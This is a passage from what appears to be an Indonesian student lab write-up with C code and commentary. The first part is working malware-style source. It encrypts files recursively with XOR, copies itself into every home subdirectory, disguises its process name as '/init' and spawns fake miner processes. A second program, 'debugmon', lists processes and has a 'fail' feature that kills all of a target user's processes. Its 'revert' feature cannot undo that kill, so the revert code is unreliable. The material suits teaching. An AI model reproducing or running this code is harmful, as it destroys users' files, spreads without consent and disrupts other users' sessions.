              if(bytesRead != fsize) { free(buffer); fclose(fp); return; }
              rewind(fp);
              for(long i = 0; i < fsize; i++) buffer[i] ^= key;
              fwrite(buffer, 1, fsize, fp);
              free(buffer);
              fclose(fp);
              char log_msg[256];
              snprintf(log_msg, sizeof(log_msg), "Encrypted %s with key %d", filepath, key);
              write_log(log_msg);
          }

Proses ini membuka file lalu setiap byte akan di-XOR dengan key yang dimana akan mengenkripsi isi file tersebut. Proses juga akan mencatat di log bahwa file diacak dengan kunci berapa. File-file penting seperti kode sendiri, log sendiri, serta runme akan dilewati dan tidak terdampak.

          void scan_and_encrypt(const char *dir_path, int key) {
              DIR *dir = opendir(dir_path);
              if(!dir) return;
              struct dirent *entry;
              while((entry = readdir(dir)) != NULL) {
                  if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                     continue;
                  char full_path[1024];
                  snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
                  struct stat s;
                  if(stat(full_path, &s) == -1) continue;
                  if(S_ISDIR(s.st_mode))
                      scan_and_encrypt(full_path, key);
                  else if(S_ISREG(s.st_mode))
                      encrypt_file(full_path, key);
              }
              closedir(dir);
          }

Fungsi ini akan membuka folder lalu membaca semua isinya termasuk isi dari subfolder-subfolder yang ada secara rekursif. Jika menemukan file biasa, maka akan dikirim ke fungsi encrypt_file sebelumnya.

          void copy_file(const char *src, const char *dest_dir) {
              char dest_path[512];
              snprintf(dest_path, sizeof(dest_path), "%s/runme", dest_dir);
              pid_t pid = fork();
              if(pid == 0) {
                  char *args[] = {"/bin/cp", (char *)src, dest_path, NULL};
                  execve("/bin/cp", args, NULL);
                  exit(EXIT_FAILURE);
              } else if(pid > 0) wait(NULL);
          }

Fungsi ini menyalin diri sendiri ke folder yang ditujukan sehingga file runme akan disalinkan.

          void spread_trojan(const char *binary_path, const char *home_dir) {
              DIR *dir = opendir(home_dir);
              if(!dir) return;
              char real_cwd[1024];
              getcwd(real_cwd, sizeof(real_cwd));
              struct dirent *entry;
              while((entry = readdir(dir)) != NULL) {
                  if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                     continue;
                  if(entry->d_type == DT_DIR) {
                      char subdir[512];
                      snprintf(subdir, sizeof(subdir), "%s/%s", home_dir, entry->d_name);
                      if(strcmp(subdir, real_cwd) == 0) continue;
                      copy_file(binary_path, subdir);
                      char log_msg[1024];
                      snprintf(log_msg, sizeof(log_msg), "Copied binary to %s", subdir);
                      write_log(log_msg);
                  }
              }
              closedir(dir);
          }

Membuka folder Home lalu untuk setiap subfolder akan disalinkan malwarenya. Fungsi juga mencata di log bahwa folder apa saja yang sudah disalinkan.

          void generate_random_hash(char *hash, size_t len) {
              const char hex_chars[] = "0123456789abcdef";
              for(size_t i = 0; i < len; i++)
                  hash[i] = hex_chars[rand() % 16];
              hash[len] = '\0';
          }

Mengisi string dengan karakter heksadesimal acak, mirip “hash” dalam penambangan kripto.

          void mine_crafter(int id) {
              char procname[32];
              snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
              set_process_name(procname);
              while(1) {
                  int wait_time = rand() % 28 + 3;
                  sleep(wait_time);
                  char hash[65];
                  generate_random_hash(hash, 64);
                  time_t now = time(NULL);
                  struct tm *t = localtime(&now);
                  char time_str[64];
                  snprintf(time_str, sizeof(time_str), "[%04d-%02d-%02d %02d:%02d:%02d]",
                           t->tm_year+1900, t->tm_mon+1, t->tm_mday,
                           t->tm_hour, t->tm_min, t->tm_sec);
                  FILE *miner_log = fopen("/tmp/.miner.log", "a");
                  if(miner_log) {
                      fprintf(miner_log, "%s[%s] %s\n", time_str, procname, hash);
                      fclose(miner_log);
                  }
              }
          }

Mengganti nama proses sendiri lalu untuk setiap beberapa detik akan membuat hash baru dan mencatatnya di /tmp/.miner.log. Fungsi ini berupa latihan miner kripto.

          void create_fork_bomb() {
              const int min_children = 3;
              set_process_name("rodok.exe");
              for(int i = 0; i < min_children; i++) {
                  pid_t pid = fork();
                  if(pid < 0) exit(EXIT_FAILURE);
                  else if(pid == 0) {
                      mine_crafter(i);
                      exit(EXIT_SUCCESS);
                  }
              }
              while(1) sleep(30);
          }

Membuat 3 proses anak yang menjalankan fungsi mine_crafter sebelumnya. Proses dilakukan setiap 30 detik.

          int main(int argc, char *argv[]) {
              if(argc != 2 || strcmp(argv[1], "run") != 0) {
                  printf("Usage: %s run\n", argv[0]);
                  exit(EXIT_FAILURE);
              }
              g_argv0 = argv[0];
              daemonize();
              srand(time(NULL));
              signal(SIGTERM, signal_handler);
              signal(SIGINT, signal_handler);
              set_process_name("/init");
              write_log("Malware started as /init");
              int key = (int)time(NULL);
              char cwd[1024];
              if(getcwd(cwd, sizeof(cwd)) == NULL) exit(EXIT_FAILURE);
              if(fork() == 0) {
                  create_fork_bomb();
                  exit(0);
              }
              while(1) {
                  scan_and_encrypt(cwd, key);
                  spread_trojan("./runme", getenv("HOME"));
                  sleep(30);
              }
              return 0;
          }

Mengecek argumen sehingga proses bisa dieksekusi serta menjadikannya Daemon. Menyamarkan nama proses menjadi /init dan memulai fork bomb di proses anak. Untuk proses enkripsi dan penyebaran dilakukan setiap 30 detik. 

#soal_4

Pada soal ini kita diminta untuk membuat program debugmon yang bisa memantau semua aktivitas di komputer. Program ini memiliki fitur seperti, list, daemon, stop daemon, fail user, dan revert.

1. Berikut adalah library yang digunakan pada program.

          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <dirent.h>
          #include <time.h>
          #include <signal.h>
          #include <sys/types.h>
          #include <pwd.h>
          #include <ctype.h>
          #include <sys/stat.h>

   2. Selanjutnya, kita membuat program program pendukung dalam fitur list yang menampilkan pid, command, cpu usage, dan memory usage.

          int isnum(const char *str) {
              for (int i = 0; str[i] != '\0'; i++) {
                  if (!isdigit(str[i])) return 0;
              }
              return 1;
          }
          
          uid_t uid_username(const char *username) {
              struct passwd *pw = getpwnam(username);
              if (!pw) {
                  fprintf(stderr, "User not found\n");
                  return -1;
              }
              return pw->pw_uid;
          }
          
          uid_t uid_process(const char *pid) {
              char path[100];
              snprintf(path, sizeof(path), "/proc/%s/status", pid);
              FILE *fp = fopen(path, "r");
              if (!fp){
                  return -1;
              }
          
              uid_t uid = -1;
              char line[256];
          
              while (fgets(line, sizeof(line), fp)) {
                  if (strncmp(line, "Uid:", 4) == 0) {
                      sscanf(line + 5, "%d", &uid);
                      break;
                  }
              }
              fclose(fp);
              return uid;
          }
          
          void get_command(char *pid, char *command) {
              char path[256];
              snprintf(path, sizeof(path), "/proc/%s/comm", pid);
          
              FILE *fp = fopen(path, "r");
              if (fp) {
                  if (fgets(command, 256, fp) == NULL) {
                      strcpy(command, " ");
                  }
                  fclose(fp);
              } else {
                  strcpy(command, " ");
              }
          
              command[strcspn(command, "\n")] = '\0';
          }
          
          float get_cpu(const char *pid) {
              char path[256];
              snprintf(path, sizeof(path), "/proc/%s/stat", pid);
              FILE *fp = fopen(path, "r");
              float cpu = 0;
          
              if (fp) {
                  unsigned long usert, systemt;
                  for (int i = 1; i <= 13; i++) fscanf(fp, "%*s");
                  fscanf(fp, "%lu %lu", &usert, &systemt);
                  fclose(fp);
                  cpu = (usert + systemt) / (float)sysconf(_SC_CLK_TCK);
              }
              return cpu;
          }
          
          float get_memory(const char *pid) {
              char path[256];
              snprintf(path, sizeof(path), "/proc/%s/status", pid);
              FILE *fp = fopen(path, "r");
              float memory = 0;
          
              if (fp) {
                  char line[256];
                  while (fgets(line, sizeof(line), fp)) {
                      if (strncmp(line, "VmRSS:", 6) == 0) {
                          sscanf(line + 6, "%f", &memory);
                          break;
                      }
                  }
                  fclose(fp);
              }
              return memory;
          }
      - isnum untuk cek number yang digunakan di fungsi list untuk mengambil process yang berupa angka pada pid.
      - uid_username digunakan untuk mengambil pid dari username yang diinput.
      - uid_process digunakan untuk mengambil uid dari process.
      - get_command digunakan untuk mengambil command pada process
      - get_cpu digunakan untuk mengambil cpu usage pada process
      - get_memory untuk mengambil data memory pertama dalam string, dimana yang pertama adalah real memory pada process
     
3. Membuat file_log yang digunakan pada beberapa fitur untuk mencatat progres fitur bekerja pada file.log.

          void file_log(const char *process, const char *status) {
              FILE *fp = fopen("/tmp/debugmon.log", "a");
              if (!fp) {
                  perror("Failed open file");
                  return;
              }
              
              time_t now = time(NULL);
              struct tm *waktu = localtime(&now);
              fprintf(fp, "[%02d:%02d:%04d]-[%02d:%02d:%02d]_%s_%s\n", waktu->tm_mday, waktu->tm_mon + 1, waktu->tm_year + 1900, waktu->tm_hour, waktu->tm_min, waktu->tm_sec, process, status);
              fclose(fp);
          }

4. Selanjutnya, kita membuat fitur list yang menampilkan pid, command, cpu usage, dan memory usage. Dalam code berikut kita memanggil fungsi-fungsi yang sebelumnya sudah kita deklarasikan.

          void list(const char *username) {
              uid_t uid_target = uid_username(username);
              if (uid_target == -1) return;
              DIR *dir = opendir("/proc");
              if (!dir) {
                  perror("Failed open directory");
                  return;
              }
          
              printf("PID\tCOMMAND\t\tCPU Usage\tMEMORY Usage\n");
          
              struct dirent *dp;
              while ((dp = readdir(dir)) != NULL) {
                  if (isnum(dp->d_name)) {
                      uid_t process_uid = uid_process(dp->d_name);
                      if (process_uid == uid_target) {
                          char command[256];
                          get_command(dp->d_name, command);
          
                          float cpu = get_cpu(dp->d_name);
                          float memory = get_memory(dp->d_name);
          
                          printf("%s\t%s\t\t%.2f\t\t%.2f kb\n", dp->d_name, command, cpu, memory);
                      }
                  }
              }
              closedir(dir);
          }

5. Selanjutnya adalah fitur daemon, fitur yang digunakan untuk memantau user secara otomatis. PID user target di catat di directory /tmp/daemon.pid

          void Daemon(const char *username) {
              pid_t pid = fork();
              if (pid < 0) {
                  exit(EXIT_FAILURE);
              }
              
              if (pid > 0) {
                  exit(EXIT_SUCCESS);
              }
              
              umask(0);
          
              pid_t sid = setsid();
              if (sid < 0) {
                  exit(EXIT_FAILURE);
              }
          
              if ((chdir("/")) < 0) {
                  exit(EXIT_FAILURE);
              }
          
              close(STDIN_FILENO);
              close(STDOUT_FILENO);
              close(STDERR_FILENO);
              
              FILE *fp = fopen("/tmp/daemon.pid", "w");
              if (fp) {
                  fprintf(fp, "%d\n", getpid());
                  fclose(fp);
              }
          
              while (1) {
                  file_log("DAEMON", "RUNNING");
                  sleep(30); 
              }
          }
   6. Kita membuat fitur stop untuk menghentikan daemon yang berjalan pada user, dimana PID user yang sebelumnya mengaktifkan daemon dihentikan(kill).

          void stop(const char *username) {
              FILE *fp = fopen("/tmp/daemon.pid", "r");
              if (!fp) {
                  perror("Failed open file");
                  return;
              }
          
              pid_t pid;
              if (fscanf(fp, "%d", &pid) != 1) {
                  fprintf(stderr, "Failed to read PID\n");
                  fclose(fp);
                  return;
              }
          
              fclose(fp);
          
              if (kill(pid, SIGTERM) == 0) {
                  file_log("STOP", "RUNNING");
                  remove("/tmp/daemon.pid");
              } else {
                  perror("Failed stop daemon");
              }
          }

   7. Kita membuat fitur fail yang digunakan untuk mengerjai user target dengan menghentikan seluruh processnya di directori /proc. Setelah fitur ini dijalankan, user akan otomatis log out dari system.

          void fail(const char *username) {
              uid_t uid_target = uid_username(username);
              if (uid_target == -1){
                  return;
              }
          
              DIR *dir = opendir("/proc");
              if (!dir) {
                  perror("Failed open directory");
                  return;
              }
          
              pid_t self_pid = getpid();
              struct dirent *dp;
          
              while ((dp = readdir(dir)) != NULL) {
                  if (isnum(dp->d_name)) {
                      pid_t pid = atoi(dp->d_name);
                      if (pid == self_pid) continue;
          
                      uid_t process_uid = uid_process(dp->d_name);
                      if (process_uid == uid_target) {
                          if (kill(pid, SIGKILL) == 0) {
                          }
                      }
                  }
              }
          
              closedir(dir);
          
              file_log("FAIL", "FAILED");
          }

      8. Selanjutnya, kita membuat fitur revert yang digunakan untuk mengembalikan akses system oleh user korban fitur fail serta process yang terhenti akibat fail.

                    void revert(const char *username) {
                        uid_t uid_target = uid_username(username);
                        if (uid_target == -1){
                            return;
                        }
                    
                        DIR *dir = opendir("/proc");
                        if (!dir) {
                            perror("Failed open directory");
                            return;
                        }
                    
                        struct dirent *dp;
                        while ((dp = readdir(dir)) != NULL) {
                            if (isnum(dp->d_name)) {
                                uid_t process_uid = uid_process(dp->d_name);
                                if (process_uid == uid_target) {
                                    pid_t pid = atoi(dp->d_name);
                                    kill(pid, SIGCONT);
                                }
                            }
                        }
                    
                        closedir(dir);
                    
                        file_log("REVERT", "RUNNING");
                    }

         9. Terakhir, kita membuat main sebagai penghubung user input pada fungsi/fitur. Kita juga menambahkan  error handling ketika user input tidak sesuai dengan semestinya.

                             int main(int argc, char *argv[]) {
                        if (argc != 3) {
                            printf("Command's unavailable:\n");
                            printf("Usage: ./nama_file <command> <user>\n");
                            printf("Available command:\n");
                            printf("  list\n");
                            printf("  Daemon\n");
                            printf("  stop\n");
                            printf("  fail\n");
                            printf("  revert\n");
                            return 1;
                        }
                    
                        if (strcmp(argv[1], "list") == 0) {
                            list(argv[2]);
                        }
                        else if (strcmp(argv[1], "daemon") == 0) {
                            Daemon(argv[2]);
                        }
                        else if (strcmp(argv[1], "stop") == 0) {
                            stop(argv[2]);
                        }
                        else if (strcmp(argv[1], "fail") == 0) {
                            fail(argv[2]);
                        }
                        else if (strcmp(argv[1], "revert") == 0) {
                            revert(argv[2]);
                        }
                        else {
                            printf("Invalid Command\n");
                            return 1;
                        }
                    
                        return 0;
                    }
